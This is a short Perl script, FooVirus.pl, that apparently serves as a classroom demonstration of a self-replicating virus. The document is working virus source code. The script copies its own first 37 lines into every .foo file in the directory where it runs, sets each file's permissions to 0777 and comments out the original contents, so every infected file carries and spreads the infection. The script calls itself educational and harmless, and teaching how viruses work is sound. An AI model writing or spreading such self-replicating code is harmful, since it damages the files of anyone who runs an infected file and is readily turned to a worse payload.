#!/usr/bin/perl

###  FooVirus.pl
###  Author: Avi kak (kak@purdue.edu)
###  Date:   April 19, 2006

print "\nHELLO FROM FooVirus\n\n";

print "This is a demonstration of how easy it is to write\n";
print "a self-replicating program. This virus will infect\n";
print "all files with names ending in .foo in the directory in\n";
print "which you execute an infected file.  If you send an\n";
print "infected file to someone else and they execute it, their,\n";
print ".foo files will be damaged also.\n\n";

print "Note that this is a safe virus (for educational purposes\n";
print "only) since it does not carry a harmful payload.  All it\n";
print "does is to print out this message and comment out the\n";
print "code in .foo files.\n\n";

open IN, "< $0";
my $virus;
for (my $i=0;$i<37;$i++) {
    $virus .= <IN>;
}
foreach my $file ( glob "*.foo" ) {
    open IN, "< $file";
    my @all_of_it = <IN>;
    close IN;
    next if (join ' ', @all_of_it) =~ /foovirus/m;
    chmod 0777, $file;
    open OUT, "> $file";
    print OUT "$virus";
    map s/^$_/#$_/, @all_of_it;
    print OUT @all_of_it;
    close OUT;
}
